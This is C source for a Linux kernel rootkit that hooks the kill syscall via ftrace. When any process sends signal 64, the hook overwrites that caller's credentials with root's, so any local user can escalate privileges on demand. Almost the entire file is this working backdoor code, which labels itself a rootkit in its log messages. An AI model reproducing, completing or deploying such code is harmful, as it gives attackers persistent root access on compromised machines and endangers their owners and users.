#include <linux/module.h>
#include <linux/kernel.h>

#include "./ftrace_helper.h"

static asmlinkage long (*orig_kill)(const struct pt_regs *);

/* Whatever calls this function will have it's creds struct replaced
 * with root's */
void set_root(void)
{
    /* prepare_creds returns the current credentials of the process */
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    /* Run through and set all the various *id's to 0 (root) */
    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    /* Set the cred struct that we've modified to that of the calling process */
    commit_creds(root);
}


/* We can only modify our own privileges, and not that of another
 * process. Just have to wait for signal 64 (normally unused) 
 * and then call the set_root() function. */
static asmlinkage int hook_kill(const struct pt_regs *regs)
{
    int sig = regs->si;
    printk("called?\n");
    if (sig == 64)
    {
        printk(KERN_INFO "rootkit: giving root...\n");
        set_root();
        return 0;
    }

    return orig_kill(regs);
}


/* Declare the struct that ftrace needs to hook the syscall */
static struct ftrace_hook hooks[] = {
    {0},
};


int main(void)
{
    printk("Greetings from SHELF. ACAB included the MMU\n");
    printk("installing hooks\n");
    printk("hooking __x64_sys_kill: %lp\n", kallsyms_lookup_name("__x64_sys_kill"));
    orig_kill = kallsyms_lookup_name("__x64_sys_kill");
    
    memset(hooks, 0, sizeof(struct ftrace_hook) * ARRAY_SIZE(hooks));
    hooks[0].original = &orig_kill;
    hooks[0].function = hook_kill;

    printk("target: %p\n", &hook_kill);
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    printk("done\n");
    return 0;
}
